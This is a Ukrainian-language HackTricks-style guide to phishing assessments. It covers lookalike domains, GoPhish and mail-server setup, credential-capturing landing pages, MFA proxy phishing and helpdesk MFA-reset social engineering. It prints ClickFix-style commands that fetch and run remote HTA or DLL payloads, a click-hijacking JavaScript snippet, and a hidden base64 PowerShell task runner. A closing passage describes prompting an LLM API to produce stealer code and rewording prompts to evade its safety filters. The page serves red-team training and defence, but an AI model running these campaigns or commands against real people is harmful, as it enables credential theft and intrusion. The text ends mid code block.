# Методологія фішингу

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Проведіть розвідку жертви
   1. Виберіть **домен жертви**.
   2. Проведіть базове перерахування вебресурсів, **шукаючи портали входу**, якими користується жертва, і **вирішіть**, який із них ви будете **імперсонувати**.
   3. Скористайтеся **OSINT**, щоб **знайти адреси електронної пошти**.
2. Підготуйте середовище
   1. **Придбайте домен**, який використовуватимете для оцінювання фішингу.
   2. **Налаштуйте записи, пов’язані з поштовою службою** (SPF, DMARC, DKIM, rDNS).
   3. Налаштуйте VPS із **gophish**.
3. Підготуйте кампанію
   1. Підготуйте **шаблон електронного листа**.
   2. Підготуйте **вебсторінку** для викрадення облікових даних.
4. Запустіть кампанію!

## Створення схожих доменних імен або придбання надійного домену

### Методи варіації доменного імені

- **Ключове слово**: доменне ім’я **містить** важливе **ключове слово** з оригінального домену (наприклад, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Піддомен із дефісом**: Замініть **крапку на дефіс** у піддомені (наприклад, www-zelster.com).
- **Новий TLD**: Той самий домен із **новим TLD** (наприклад, zelster.org).
- **Гомогліф**: **Замініть** літеру в доменному імені на **схожу на вигляд літеру** (наприклад, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Перестановка:** **Поміняйте місцями дві літери** в доменному імені (наприклад, zelsetr.com).
- **Однина/множина**: Додайте або вилучіть «s» у кінці доменного імені (наприклад, zeltsers.com).
- **Пропуск**: **Вилучіть одну** з літер у доменному імені (наприклад, zelser.com).
- **Повторення:** **Повторіть одну** з літер у доменному імені (наприклад, zeltsser.com).
- **Заміна**: Як гомогліф, але менш непомітно. Замініть одну з літер у доменному імені, наприклад, на літеру, що розташована поруч з оригінальною на клавіатурі (наприклад, zektser.com).
- **Доданий піддомен**: Додайте **крапку** всередину доменного імені (наприклад, ze.lster.com).
- **Вставлення**: **Вставте літеру** в доменне ім’я (наприклад, zerltser.com).
- **Відсутня крапка**: Додайте TLD до доменного імені (наприклад, zelstercom.com).

**Автоматичні інструменти**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Вебсайти**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **ймовірність, що деякі біти, які зберігаються або передаються, автоматично інвертуються** через різні чинники, як-от сонячні спалахи, космічні промені або помилки обладнання.

Якщо **застосувати цю концепцію до DNS-запитів**, домен, який **отримує DNS-сервер**, може відрізнятися від домену, до якого спочатку надійшов запит.

Наприклад, зміна одного біта в домені «windows.com» може перетворити його на «windnws.com».

Зловмисники можуть **скористатися цим, зареєструвавши кілька доменів із інвертованими бітами**, схожих на домен жертви. Їхня мета — перенаправляти легітимних користувачів на власну інфраструктуру.

Докладніше читайте тут: [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Придбання надійного домену

На [https://www.expireddomains.net/](https://www.expireddomains.net) можна пошукати домен із завершеним терміном реєстрації, який можна використати.\
Щоб переконатися, що домен із завершеним терміном реєстрації, який ви збираєтеся придбати, **вже має хороші показники SEO**, можна перевірити його категорію на таких сайтах:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Виявлення адрес електронної пошти

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (повністю безкоштовно)
- [https://phonebook.cz/](https://phonebook.cz) (повністю безкоштовно)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **знайти більше** дійсних адрес електронної пошти або **перевірити вже знайдені**, можна перевірити, чи вдасться виконати їхній brute force на SMTP-серверах жертви. [Дізнайтеся тут, як перевіряти та знаходити адреси електронної пошти](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте: якщо користувачі використовують **вебпортал для доступу до пошти**, можна перевірити, чи вразливий він до **brute force імен користувачів**, і за можливості експлуатувати цю вразливість.

## Налаштування GoPhish

### Встановлення

Його можна завантажити з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте й розпакуйте його в `/opt/gophish`, а потім запустіть `/opt/gophish/gophish`\
У виводі буде вказано пароль адміністратора для порту 3333. Тож перейдіть на цей порт і скористайтеся цими обліковими даними, щоб змінити пароль адміністратора. Можливо, потрібно буде перенаправити цей порт на локальний:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Налаштування

**Налаштування TLS-сертифіката**

Перед цим кроком ви вже маєте **придбати домен**, який збираєтеся використовувати, і він має **вказувати** на **IP-адресу VPS**, де ви налаштовуєте **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Налаштування пошти**

Почніть зі встановлення: `apt-get install postfix`

Потім додайте домен у такі файли:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення таких змінних у файлі /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Нарешті, змініть файли **`/etc/hostname`** і **`/etc/mailname`**, вказавши в них назву домену, і **перезапустіть VPS.**

Тепер створіть **DNS A-запис** для `mail.<domain>`, який вказує на **IP-адресу** VPS, і **DNS MX-запис**, який вказує на `mail.<domain>`

Тепер перевірмо надсилання електронного листа:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Конфігурація Gophish**

Зупиніть виконання Gophish і налаштуймо його.\
Змініть `/opt/gophish/config.json` так, як показано нижче (зверніть увагу на використання https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Налаштування служби gophish**

Щоб створити службу gophish, яка запускатиметься автоматично та якою можна буде керувати як службою, створіть файл `/etc/init.d/gophish` із таким вмістом:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Завершіть налаштування служби та перевірте її, виконавши:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Налаштування поштового сервера та домену

### Зачекайте й дійте легітимно

Що старший домен, то менша ймовірність, що його позначать як спам. Тому перед оцінюванням фішингу потрібно зачекати якомога довше (щонайменше 1 тиждень). Крім того, якщо розмістити сторінку про сектор із доброю репутацією, домен матиме кращу репутацію.

Зверніть увагу: навіть якщо потрібно зачекати тиждень, налаштувати все можна вже зараз.

### Налаштуйте запис Reverse DNS (rDNS)

Створіть запис rDNS (PTR), який пов’язує IP-адресу VPS із доменним ім’ям.

### Запис Sender Policy Framework (SPF)

Ви маєте **налаштувати запис SPF для нового домену**. Якщо ви не знаєте, що таке запис SPF, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Щоб створити політику SPF, скористайтеся [https://www.spfwizard.net/](https://www.spfwizard.net) (вкажіть IP-адресу VPS-сервера).

![Форма SPF Wizard для створення запису SPF для фішингового домену](<../../images/image (1037).png>)

Цей вміст потрібно додати до запису TXT домену:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Запис Domain-based Message Authentication, Reporting & Conformance (DMARC)

Ви повинні **налаштувати запис DMARC для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Потрібно створити новий DNS TXT-запис для hostname `_dmarc.<domain>` із таким вмістом:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Потрібно **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DKIM, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей посібник базується на: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Потрібно об’єднати обидва значення B64, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірте оцінку конфігурації електронної пошти

Це можна зробити за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть електронний лист на вказану там адресу:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Також можна **перевірити конфігурацію електронної пошти**, надіславши листа на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього потрібно **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо надіслати листа від імені root).\
Переконайтеся, що ви успішно проходите всі тести:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Також можна надіслати **повідомлення на контрольовану вами адресу Gmail** і перевірити **заголовки листа** у папці «Вхідні» Gmail: у полі заголовка `Authentication-Results` має бути `dkim=pass`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Видалення зі списку блокування Spamhaus

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може повідомити, чи заблоковано ваш домен у Spamhaus. Подати запит на видалення домену/IP можна тут: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення зі списку блокування Microsoft

​​Подати запит на видалення домену/IP можна тут: [https://sender.office.com/](https://sender.office.com).

## Створення та запуск кампанії GoPhish

### Профіль надсилання

- Укажіть **назву для ідентифікації** профілю відправника
- Вирішіть, з якого облікового запису надсилатимете phishing-листи. Рекомендовані варіанти: _noreply, support, servicedesk, salesforce..._
- Поля імені користувача та пароля можна залишити порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors

![Створення та запуск кампанії GoPhish - Профіль надсилання: поля імені користувача та пароля можна залишити порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується скористатися функцією "**Send Test Email**", щоб перевірити, чи все працює.\
> Раджу **надсилати тестові листи на адреси 10min mail**, щоб не потрапити до списку блокування під час тестування.

### Шаблон листа

- Укажіть **назву для ідентифікації** шаблону
- Потім напишіть **тему** (нічого незвичного — просто те, що ви могли б очікувати побачити у звичайному листі)
- Переконайтеся, що встановлено прапорець "**Add Tracking Image**"
- Напишіть **шаблон листа** (можна використовувати змінні, як у наведеному нижче прикладі):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Зверніть увагу: **щоб підвищити правдоподібність електронного листа**, рекомендується використати підпис із листа клієнта. Варіанти:

- Надішліть лист на **неіснуючу адресу** й перевірте, чи є у відповіді підпис.
- Знайдіть **публічні адреси електронної пошти**, наприклад info@ex.com, press@ex.com або public@ex.com, надішліть їм листа й дочекайтеся відповіді.
- Спробуйте зв’язатися з **якоюсь виявленою дійсною адресою** й дочекайтеся відповіді.

![Профіль надсилання — шаблон електронного листа: спробуйте зв’язатися з якоюсь виявленою дійсною адресою й дочекайтеся відповіді](<../../images/image (80).png>)

> [!TIP]
> Шаблон електронного листа також дає змогу **додавати файли до листа**. Якщо ви також хочете викрасти NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Цільова сторінка

- Вкажіть **назву**
- **Напишіть HTML-код** вебсторінки. Зверніть увагу, що вебсторінки можна **імпортувати**.
- Установіть прапорці **Capture Submitted Data** і **Capture Passwords**
- Налаштуйте **переспрямування**

![Шаблон електронного листа — цільова сторінка: установіть прапорці Capture Submitted Data і Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай потрібно буде змінити HTML-код сторінки й провести кілька локальних тестів (можливо, використовуючи сервер Apache), **поки результат вас не влаштує.** Потім вставте цей HTML-код у поле.\
> Якщо для HTML потрібні **статичні ресурси** (наприклад, сторінки CSS і JS), їх можна зберегти в _**/opt/gophish/static/endpoint**_, а потім отримати до них доступ через _**/static/\<filename>**_

> [!TIP]
> Для переспрямування можна **спрямувати користувачів на справжню головну сторінку жертви** або, наприклад, перенаправити їх на _/static/migration.html_, показати **індикатор завантаження (**[**https://loading.io/**](https://loading.io)**) протягом 5 секунд, а потім повідомити, що процес завершився успішно**.

### Користувачі та групи

- Вкажіть назву
- **Імпортуйте дані** (зверніть увагу: щоб використовувати шаблон із прикладу, потрібні ім’я, прізвище та адреса електронної пошти кожного користувача)

![Цільова сторінка — користувачі та групи: імпортуйте дані (зверніть увагу: щоб використовувати шаблон із прикладу, потрібні ім’я, прізвище та адреса електронної пошти кожного користувача)](<../../images/image (163).png>)

### Кампанія

Нарешті, створіть кампанію, указавши назву, шаблон електронного листа, цільову сторінку, URL-адресу, профіль надсилання та групу. Зверніть увагу, що URL-адреса буде посиланням, яке надішлють жертвам.

Зверніть увагу, що **профіль надсилання дає змогу надіслати тестовий лист і побачити, як виглядатиме фінальний фішинговий лист**:

![Користувачі та групи — кампанія: зверніть увагу, що профіль надсилання дає змогу надіслати тестовий лист і побачити, як виглядатиме фінальний фішинговий лист](<../../images/image (192).png>)

Коли все буде готово, просто запустіть кампанію!

## Клонування вебсайту

Якщо з якоїсь причини ви хочете клонувати вебсайт, перегляньте цю сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Документи та файли з бекдором

Під час деяких фішингових оцінювань (переважно для Red Teams) може знадобитися **надіслати файли з певним типом бекдору** (наприклад, C2 або просто щось, що ініціює автентифікацію).\
Приклади наведено на цій сторінці:


{{#ref}}
phishing-documents.md
{{#endref}}

## Фішинг MFA

### Через проксі MitM

Попередня атака досить хитра: ви підробляєте справжній вебсайт і збираєте введену користувачем інформацію. На жаль, якщо користувач не ввів правильний пароль або якщо підроблена вами програма налаштована з 2FA, **ця інформація не дасть вам змоги видати себе за користувача, якого ви ошукали**.

Тут стають у пригоді такі інструменти, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей інструмент дає змогу виконати атаку типу MitM. Загалом атака відбувається так:

1. Ви **підробляєте форму входу** справжньої вебсторінки.
2. Користувач **надсилає** свої **облікові дані** на вашу підроблену сторінку, а інструмент передає їх справжній вебсторінці, **перевіряючи, чи правильні ці облікові дані**.
3. Якщо для облікового запису налаштовано **2FA**, сторінка MitM запросить її, а щойно **користувач введе** її, інструмент передасть її справжній вебсторінці.
4. Після автентифікації користувача ви (як атакувальник) **перехопите облікові дані, 2FA, cookie та будь-яку інформацію** про кожну взаємодію користувача під час атаки MitM.

### Через VNC

А що, як замість того, щоб **спрямувати жертву на шкідливу сторінку**, схожу на оригінальну, ви спрямуєте її до **сеансу VNC із браузером, підключеним до справжньої вебсторінки**? Ви зможете бачити, що вона робить, викрасти пароль, використану MFA, cookie...\
Це можна зробити за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Виявлення факту виявлення

Очевидно, один із найкращих способів з’ясувати, чи вас викрили, — **перевірити, чи є ваш домен у чорних списках**. Якщо його там зазначено, це означає, що ваш домен якимось чином визнали підозрілим.\
Один зі способів перевірити, чи є ваш домен у чорних списках, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак є й інші способи з’ясувати, чи **активно жертва шукає підозрілу фішингову активність у мережі**, як описано тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **придбати домен із назвою, дуже схожою на домен жертви**, та/або **створити сертифікат** для **піддомену** домену, яким ви керуєте, **додавши до нього** **ключове слово** з домену жертви. Якщо **жертва** виконає з ними будь-яку **взаємодію через DNS або HTTP**, ви знатимете, що **вона активно шукає** підозрілі домени, тож вам доведеться діяти дуже непомітно.<sup>[[2]](#references)</sup>

### Оцінювання фішингового листа

Скористайтеся [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи потрапить ваш лист до папки зі спамом, чи його заблокують, чи він успішно дійде до адресата.

## Компрометація облікового запису за допомогою цільової взаємодії (скидання MFA через службу підтримки)

Сучасні групи зловмисників дедалі частіше повністю відмовляються від фішингових листів і **безпосередньо атакують процеси служби підтримки / відновлення облікових записів**, щоб обійти MFA. Така атака повністю спирається на легітимні інструменти: отримавши дійсні облікові дані, оператор переміщується мережею за допомогою вбудованих інструментів адміністрування — шкідливе ПЗ не потрібне.<sup>[[6]](#references)</sup>

### Схема атаки
1. Розвідка цілі
   * Зберіть особисті та корпоративні дані з LinkedIn, витоків даних, публічного GitHub тощо.
   * Визначте облікові записи високої цінності (керівники, ІТ-фахівці, фінансисти) і з’ясуйте **точний процес служби підтримки** для скидання пароля / MFA.
2. Соціальна інженерія в реальному часі
   * Зателефонуйте, напишіть у Teams або чат служби підтримки, видаючи себе за ціль (часто використовуючи **підміну Caller ID** або **клонований голос**).
   * Надайте зібрані раніше персональні дані, щоб пройти перевірку на основі контрольних запитань.
   * Переконайте агента **скинути секрет MFA** або виконати **SIM-swap** зареєстрованого номера телефону.
3. Негайні дії після отримання доступу (≤60 хвилин у реальних випадках)
   * Закріпіться через будь-який вебпортал SSO.
   * Перелічіть AD / AzureAD за допомогою вбудованих інструментів (без завантаження бінарних файлів):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Латеральне переміщення за допомогою **WMI**, **PsExec** або легітимних **RMM**-агентів, уже внесених до списку дозволених у середовищі.

### Виявлення та пом’якшення наслідків
* Розглядайте відновлення облікових записів через службу підтримки як **привілейовану операцію** — вимагайте додаткової автентифікації та схвалення керівника.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщатимуть про такі події:  
  * Зміна методу MFA + автентифікація з нового пристрою / геолокації.
  * Негайне підвищення привілеїв того самого суб’єкта (користувач-→-адмін).
* Записуйте дзвінки до служби підтримки та вимагайте **зворотного дзвінка на вже зареєстрований номер** перед будь-яким скиданням.
* Упровадьте **Just-In-Time (JIT) / Privileged Access**, щоб облікові записи після скидання пароля **не отримували автоматично токени з високими привілеями**.

---

## Масштабна оманлива тактика – SEO-отруєння та кампанії «ClickFix»
Масові угруповання компенсують витрати на цільові операції масштабними атаками, перетворюючи **пошукові системи й рекламні мережі на канал доставки**.<sup>[[6]](#references)</sup>

1. **SEO-отруєння / шкідлива реклама** виводить фальшивий результат, як-от `chromium-update[.]site`, на перше місце серед пошукових оголошень.
2. Жертва завантажує невеликий **завантажувач першого етапу** (часто JS/HTA/ISO). Приклади, виявлені Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Завантажувач викрадає файли cookie браузера та бази облікових даних, а потім завантажує **прихований завантажувач**, який *у реальному часі* вирішує, чи розгортати:
   * RAT (наприклад, AsyncRAT, RustDesk)
   * ransomware / wiper
   * компонент закріплення в системі (ключ Run реєстру + заплановане завдання)

### Поради щодо посилення захисту
* Блокуйте нещодавно зареєстровані домени та застосовуйте **Advanced DNS / URL Filtering** як до *пошукової реклами*, так і до електронної пошти.
* Дозволяйте встановлення програм лише з підписаних пакетів MSI / Store, забороніть виконання `HTA`, `ISO`, `VBS` за допомогою політик.
* Відстежуйте дочірні процеси браузерів, що запускають інсталятори:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Шукайте LOLBins, якими часто зловживають лоадери першого етапу (наприклад, `regsvr32`, `curl`, `mshta`).

### Перехоплення кліку кнопки завантаження з передаванням до TDS
Деякі підроблені портали програмного забезпечення залишають видимий `href` для завантаження вказаним на **справжню** URL-адресу GitHub/release, але перехоплюють **першу** взаємодію користувача за допомогою JavaScript і спрямовують жертву натомість через ланцюжок Traffic Distribution System (TDS).<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Ключові ознаки:
- Hook зазвичай запускається у **capture phase** (`true`) на `document`, тому спрацьовує раніше за обробники сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб прив’язати redirect до дійсного **user gesture** і підвищити ймовірність обходу блокувальника спливних вікон.
- Деякі варіанти заздалегідь відкривають `about:blank` або імітують кліки по `<a target="_blank">`, а URL TDS призначають лише пізніше.
- Обмеження на боці браузера часто зберігаються в `localStorage`, тому під час **першого кліку** користувач може потрапити на malware, а після оновлення сторінки чи повторних спроб — перейти за видимим посиланням, що виглядає безпечним.
- TDS може фільтрувати трафік за referrer, доменом входу, GEO, fingerprint браузера/пристрою, перевірками VPN/datacenter, контекстом кліку та лічильниками сеансів, через що повторне відтворення аналітиком дає непередбачувані результати.

Ідеї для захисників:
- Порівнюйте **відображений** `href` із фактичною ціллю переходу, що формується під час кліку.
- Шукайте обробники `document.addEventListener(..., true)`, які викликають `preventDefault()` і `stopImmediatePropagation()` разом із `window.open`, `about:blank` або імітованими кліками по anchor.
- Розглядайте кластери нещодавно зареєстрованих доменів для завантаження ПЗ, які завантажують один і той самий етап CloudFront/JS, як виразну ознаку SEO poisoning/TDS.

### ClickFix із фальшивих сторінок перевірки + завантаження LOLBAS, що маскуються під архіви
Деякі гілки TDS ведуть на фальшиву сторінку перевірки (у стилі Cloudflare/IUAM), яка вказує жертві запустити довірений бінарний файл Windows, наприклад:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL видає себе за архів `.7z`; додані дані архіву можуть бути лише приманкою.
- Наступні етапи часто продовжують маскувати тип файлу (`.rtf` для PowerShell, `.asar` для Python, ZIP-архіви з доповненими бінарними файлами), а потім переходять до **ручного PE mapping / виконання в пам’яті**.
- Якщо ви реагуєте на один із таких ланцюжків, збережіть **мережеві дані й дані з пам’яті від першого успішного запуску**: під час повторних запусків може відображатися лише нешкідливий шлях інсталятора/SFX або вони можуть завершитися невдачею, оскільки видача payload/key була прив’язана до початкової сесії TDS.

### Tradecraft доставки DLL через ClickFix (підроблене оновлення CERT)
* Приманка: клонована рекомендація національного CERT із кнопкою **Update**, яка показує покрокові інструкції з «виправлення». Жертвам пропонують запустити batch-файл, який завантажує DLL і виконує її через `rundll32`.<sup>[[12]](#references)</sup>
* Типовий ланцюжок batch-команд, який спостерігали:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` зберігає payload у `%TEMP%`, коротка пауза приховує мережевий джиттер, потім `rundll32` викликає експортовану точку входу (`notepad`).
* DLL передає ідентифікаційні дані хоста та опитує C2 кожні кілька хвилин. Віддалені завдання надходять у вигляді **PowerShell, закодованого в base64**, і виконуються приховано, з обходом політики виконання:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Це зберігає гнучкість C2 (сервер може змінювати завдання без оновлення DLL) і приховує вікна консолі. Відстежуйте дочірні процеси PowerShell для `rundll32.exe`, у командному рядку яких разом використовуються `-WindowStyle Hidden`, `FromBase64String` і `Invoke-Expression`.
* Захисники можуть шукати HTTP(S)-колбеки формату `...page.php?tynor=<COMPUTER>sss<USER>` і п’ятихвилинні інтервали опитування після завантаження DLL.

---

## Фішингові операції з використанням AI
Зловмисники тепер поєднують **LLM і API для клонування голосу**, щоб створювати повністю персоналізовані приманки й взаємодіяти в реальному часі.

| Рівень | Приклад використання зловмисником |
|-------|-----------------------------|
|Автоматизація|Генерація й надсилання понад 100 тис. електронних листів / SMS із варіативними формулюваннями й посиланнями для відстеження.|
|Генеративний AI|Створення *унікальних* листів із згадками про публічні M&A та внутрішні жарти із соцмереж; голос CEO, підроблений за допомогою deepfake, для шахрайських дзвінків.|
|Агентний AI|Автоматична реєстрація доменів, збір даних із відкритих джерел і створення наступних листів, коли жертва натискає посилання, але не вводить облікові дані.|

**Захист:**  
• Додавайте **динамічні банери**, що позначають повідомлення, надіслані за допомогою ненадійної автоматизації (за аномаліями ARC/DKIM).  
• Використовуйте **контрольні фрази для голосової біометричної перевірки** під час телефонних запитів із високим рівнем ризику.  
• Постійно моделюйте приманки, створені AI, у програмах підвищення обізнаності — статичні шаблони застаріли.

Див. також — зловживання агентним переглядом для викрадення облікових даних через фішинг:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Див. також — зловживання AI-агентами локальними інструментами CLI та MCP (для інвентаризації секретів і виявлення загроз):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Створення фішингового JavaScript під час виконання за допомогою LLM (генерація коду в браузері)

Зловмисники можуть розміщувати HTML, що виглядає нешкідливо, і **генерувати stealer під час виконання**, запитуючи JavaScript у **довіреного API LLM**, а потім виконуючи його в браузері (наприклад, через `eval` або динамічний `<script>`).<sup>[[8]](#references)</sup>

1. **Промпт як обфускація:** кодуйте URL для ексфільтрації / рядки Base64 у промпті; змінюйте формулювання, щоб обходити фільтри безпеки й зменшувати кількість галюцинацій.
2. **Виклик API на стороні клієнта:** під час завантаження JS викликає публічну LLM (Gemini/DeepSeek тощо) або проксі CDN; у статичному HTML міститься лише промпт / виклик API.
3. **Об’єднання й виконання:** об’єднайте відповідь і виконайте її (поліморфний код для кожного відвідування):

```javascript
